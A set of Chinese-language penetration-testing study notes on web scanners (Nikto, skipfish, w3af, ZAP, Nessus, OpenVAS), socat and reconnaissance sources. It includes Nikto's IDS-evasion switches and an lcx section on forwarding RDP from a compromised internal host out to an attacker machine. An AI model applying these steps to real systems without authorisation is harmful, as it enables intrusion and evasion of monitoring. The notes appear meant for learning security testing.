+有的管理员会把网站代码打包放在根目录而不删除。
+网站配置页面（探针）被web访问。
+phpinfo.php泄露信息
+	80.VeroSign颁发和签名网站ssl证书。自己办法的证书，别人不信任根。
+	81.https://www.baidu.com/robots.txt
+.....
+User-agent: EasouSpider
+Disallow: /baidu
+Disallow: /s?
+Disallow: /shifen/
+Disallow: /homepage/ 
+Disallow: /cpro
+Disallow: /ulink?
+Disallow: /link?
+
+User-agent: *
+Disallow: /
+
+不让用户进入根目录，不让爬虫爬取一些目录。
+
+
+
+网站复制机：
+Httrack 使用很简单直接运行命令然后按照提示来就行
+问题：只能胜任静态网站获取，我的www.hellovega.cn/jwc只有当三个图片下载完成以后才会不显示齿轮，但是用Httrack去爬取只能获取一瞬间的，那么只得到了一张背景图片，于是就因为js的设置一直卡在齿轮的显示
+
+
+
+
+
+
+web信息收集之Nikto:	会发出一些奇怪的包用于绕过IDS，通过对接收包进行分析与显示判断漏洞
+nikto -h host_ip -p port
+root@kali:~# nikto -h 192.168.1.1 -p 80
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.1
++ Target Hostname:    192.168.1.1
++ Target Port:        80
++ Start Time:         2017-05-18 21:07:17 (GMT-4)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+
+
+-no404 不会对404发多个无效包进行判断。直接根据返回的状态与页面内容。
+-update 跟新
+-host （-port）默认http 80 #使用url不需要指定80端口#-hostsl 用来进行https（-p指定443）
+nmap -p80 192.168.1.0/24 -oG -| nikto -host - #可能发现很多很奇葩的URL，但是都指向同一个html。存在对可能目录结构的查询
+root@kali:~# nmap -p80 192.168.1.0/24 -oG -
+# Nmap 7.25BETA1 scan initiated Thu May 18 21:10:49 2017 as: nmap -p80 -oG - 192.168.1.0/24
+Host: 192.168.1.1 (Battery.lan)	Status: Up
+Host: 192.168.1.1 (Battery.lan)	Ports: 80/open/tcp//http///
+Host: 192.168.1.147 (DESKTOP-FRNFA24.lan)	Status: Up
+Host: 192.168.1.147 (DESKTOP-FRNFA24.lan)	Ports: 80/filtered/tcp//http///
+Host: 192.168.1.182 ()	Status: Up
+Host: 192.168.1.182 ()	Ports: 80/closed/tcp//http///
+# Nmap done at Thu May 18 21:10:51 2017 -- 256 IP addresses (3 hosts up) scanned in 2.43 seconds
+
+-useproxy http:localhost:8087 #8087端口由goagent连着GoAgent
+-vhost 指定主机头
+-id 基于http的协议的身份认证，基本是嵌入式设备（不是表单的身份认证）
+-evasion 使用LibWhisker对IDS的躲避技术，后面跟使用方法的数字：
+1 随机URL编码（非UTF-8方式）
+2 自选择路径（/./）
+3 过早结束的URL
+4 优先考虑长随机字符串
+5 参数欺骗
+6 使用TAB 作为命令的分隔符
+7 使用变化的URL
+8 使用windows路径分隔符'\'
+
+在扫描过程中允许交互：
+v 开启/关闭显示详细过程信息  verbose
+d 开启/关闭显示最详细信息（把请求内容显示出来）  debug #'whisker'=> 这个表示这个包是发出去
+e 错误报告 error
+p 告知进度 progress
+r 显示/关闭重定向 redirect
+c 显示/关闭cookie cookie display
+a 显示/关闭身份认证  auth display
+q 退出 
+N 停止本次，开始Next host
+P Pause/start
+/etc/nikto.conf 里面有useagent的设置，cookie设置STATIC-COOKIE="cookie1"="cookie value";"cookie2"="cookie val"(从而支持身份认证，nikto会进行合并成一个字符串)
+
+
+
+
+
+web信息收集之vega：（可以使用bp进行代替）
+windows系统没加入域，默认是NTML身份认证。和base http authentication、digest http authentication都是web server的身份认证。macro是表单认证。
+手动爬明站，不会提交攻击参数，开着软件代理模式。他会获取你的访问数据与得到数据。那么要当做浏览器不会缓存内容，在vega中有设置，使得每一次都进行重新请求被vega捕获。之后可以对抓到的东西进行重放。可以进行请求/响应截断。
+vega默认侦听8888,端口，使用netstat -pantu | grep 8888查看
+左下角的console在配置了Scanner的Debug后，可以看到详细信息。
+为了使用ssl，需要信任Vega代理的证书，打开扫描以后，http://vega/ca.crt就可以加载证书
+在配置项里面有一个External Proxy 是外部代理，避免自己主机被封杀。
+Vega的代理可以给局域网使用，只要设置的代理ip不是127.0.0.1的8888，而应该改成正常IP的8888.
+表单式身份认证使用macro（用于web application），NTML、basic http、degist http是web server的身份认证。
+
+
+web信息收集之skipfish：
+主要寻找代码漏洞
+号称启发式扫描。速度很快，单线程异步IO。
+每一次会在终端上的某位置写入信息，只有当终端足够大的时候才正常显示，否则信息的写入位置很乱。
+-o 必须要有的是输出参数，因为输出的信息多，在终端里面看有点麻烦
+skipfish IP -o test #如果没有test目录会自动生成，这条命令是错误的，下面那条才是对的
+skipfidh -o 文件 http://IP
+skipfish -o test @url.txt #批量扫描
+它的字典以wl结尾wordlist，-S引用
+-W 将目标特有的路径写到后面跟着的文件中
+skipfish -o test -S 字典 http://IP -W a.wl 
+-X 不检查包含后面跟着的字符串的URL，比如说logout  exclude
+-I 只检查包含后面跟着的字符串的URL		  include
+-K 不对指定的参数进行fuzz测试			  skip
+-D 允许跨站点到另一个站
+
+-l 每秒中最大请求书，会尽可能达到最大值
+-m 每IP最大并发（多线程）连接数目
+
+-A 身份认证usre:pass	authentication
+-C "name=val"		cookie
+表单提交：（终端中参数与后面参数的值之间使用空格隔开）
+--auth-form 表单存在URL
+--auth-form-target  表单提交URL
+--auth-user-field HTML代码中输入账号的变量名字
+--auth-user 
+--auth-pass-field HTML代码中输入密码的变量名字
+--auth-pass 
+--auth-verify-url 提交成功后会跳到哪里
+
+
+web框架之w3af（web application attack and audit framework）扫描器：
+有些web应用会自定义头进行认证等。这时候就要使用自动对头的修改。
+10类插件：
+audit 审计（所有扫描）
+crawl 爬网
+infrastructure 扫描基础架构信息（语言等），扫描waf
+grep 被动信息收集，根据扫描的流量
+evasion 逃避 检测
+mangle 对经过流量内容进行替换
+auth 身份认证
+bruteforce
+attack 据说不可以修改
+output
+几种界面：默认gui
+root@kali:~# w3af
+w3af          w3af_console  w3af_gui   
+
+w3af_console:
+w3af/profiles 对插件按某种选中的配置文件
+help查看帮助，交互模式下的参数不需要横杆
+plugins 进入plugins这一级
+list audit列出audit大类
+back 返回上一级 #C-C也是back与exit的结合手段，不同层级代表不同命令
+save_as name 把当前配置保存为一个profile#不过这样保存，如果指定了字典路径是不带字典的，不方便给别人。所以可以使用完全独立的打包，在save_as的时候加上一个self_contained参数
+start
+
+全局参数：
+http_setting
+misc_setting
+进入以后使用set命令进行设置,进去以后help可以看到有个view来查看（而不是再用help查看）。set xxx 直接按Table键，后面出现True。而且我觉得不能小写。
+默认user-Angent是w3af.org
+
+w3af（w3af_gui）：
+tools提供编码功能（URL、HTML、double HTML、base64、Hex）
+表单身份认证detailed比generic全一些。data_format中%u=%U意为账号变量名工资=账号变量值。
+
+
+在截断代理里面，对网址进行正则表达式（使用$包裹）的修改：
+GET http://xxxxxx/dvwa/$range(10)$/，进行1-10的遍历。请查看帮助，里面的例子都是可以用到的。
+$string.lowercase[:26]$就是对小写字母的遍历
+截断代理对方法的默认支持GET、POST，自己可以添加
+
+
+
+web扫描器之Arachni：
+http://www.arachni-scanner.com/download/#linux
+包依赖自包含
+
+web扫描器之OWASP_ZAP:
+########################攻击脚本代码值的学习
+每一个存储都称为会话
+启动起来就会开始监听8080
+Fuzz（后台和密码爆破）的两种启动方式：识别响应内容不同，是状态码和包的大小
+API http://zap/要求浏览器已经使用了OWASP_ZAP的代理
+
+	
+Nessus：
+	安装：http://blog.csdn.net/u012318074/article/details/72354387?locationNum=13&fps=1
+	
+	安装到/opt/nessus。/etc/ini.d/nessus start/status 登录kali:8834
+	扫描前要先设置策略：Permissions里面No Access是只给自用，can use是开放。Wake-On-Lan就是远程唤醒服务器。在配置的Credentials中，linux使用ssh进行连接。
+	支持把结果用邮件发送给目，扫描完后，结果还可以用pdf、HTML等等格式导出。
+	安装以后插件跟新失败，提示运行“nesssuscli update”这个命令来完成。nesssuscli是/opt/nessus/sbin中的一个程序
+	有API key。
+	
+openvas：  Nessus（家庭版免费）的开源版本
+	apt-get install openvas
+	openvas-setup 安装配置openvas，但是kali好像已经自动配置过了
+	openvas-check-setup  检查安装 (如有提示错误的请按提示修复)
+	openvas-feed-update 升级
+	openvas-start 启动  openvas-stop 关闭
+	https://127.0.0.1:9392 （登录账号 admin 和你前面设置的密码）使用Greenbone对OpenVas进行图形化管理，便于通过浏览器来建立扫描任务,是使用最简便的客户层组件。
+	编辑 /lib/systemd/system/greenbone-security-assistant.service 
+		修改 --listen=127.0.0.1 为 --listen=0.0.0.0   允许网站端口能被非本机访问
+		systemctl daemon-reload  openvas-start 重启服务，加载配置文件
+		
+NeXpose、Metasploit Pro、Core Imapct、Canvas、qualys
+snort、alinevault
+
+端口转发;
+lcx 学习; http://blog.csdn.net/stonesharp/article/details/56834347
+lcx 是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上，这样连接B机的3389端口就相当于连接A机的3389端口。因为直接使用ipconfig可以知道对方的ip只有内网，所以只能使用这种外连的方式。
+lcx –listen 51 3389 是在具有外网独立IP的计算机上执行，表示在本机上监听51端口（外网ip），将本机3389端口的数据转发给51端口（本地ip）
+lcx –slave 218.69.*.*本机网络ip 51 一个内网ip 3389 表示将本机IP地址为192.168.80.129的3389端口转发到远程地址为“218.69.*.*”的51端口 
+lcx -tran <ConnectPort> <TransmitHost> <TransmitPort> 端口映射（相当于-slave中的第一个参数是自己）
+lcx的设计是希望从里面连出来，所以是肉鸡外连，本机只需要进行监听，总感觉多了一步，数据直接从51端口发出去不就好了？
+是的，这个步骤是多余的。直接使用外网的ip配合51号端口就好了。
+
+
+内部路由协议查点：
+	使用IPRAS路由器攻击套装中的ASS
+
+socat：  socat - Multipurpose relay (SOcket CAT) 
+kali自带的一个程序,nc的升级，本质目的是建立多种情况下应用程序之间双向通信的管道，支持screen和&
+socat TCP4-LISTEN:188,reuseaddr,fork TCP4:192.168.1.22:123& 在本地监听188端口，并将请求转发至192.168.1.22的123端口（每一次188端口被连接都会单独创建一个线程来处理client），reuseaddr 是希望主线程意外退出就马上重启即便有些socket没有被关闭，su=nobody，配合fork使用更加安全
+结果和telnet、nc一致的一般连接:
+	socat - tcp:192.168.1.18:80《=》nc 192.168.1.18 80
+	socat - TCP4:www.domain.org:80  
+socat	TCP4-LISTEN:80,bind=myaddr1,reuseaddr,fork,su=nobody,range=10.0.0.0/8 \    bind了第一个网卡地址，也是默认情况
+        TCP4:www.domain.org:80,bind=myaddr2  bind了第二个网卡地址
+socat EXEC:"mail.sh target@domain.com",fdin=3,fdout=4 \
+       TCP4:mail.relay.org:25,crnl,bind=alias1.server.org,mss=512
+
+VPN:
+    下列专门针对采用了因特网密钥交换协议IKE认证的IPSec VPN
+    ike-scan 扫描、查点、
+    ikeprobe 识别对激进模式是否支持
+	
+	
+
+
+
+
+
+
+
+
+
+	
+指定host域名获取：
+axfr查询-》theharverster、google hacking（dnsrecon -t goo）、www.netcraft.com、shodan.io、专门查域名网站等 可能辅以nslookup、dig、dnsrecon来轻微交互查询（不过可以指定其他域名服务器来避开直接交流，brute也是这样）-》brute
+社交网络、论坛、新闻组、几个重要的职场app（钉钉）
+工商注册
+招聘网站
+还有买东西可能的网站
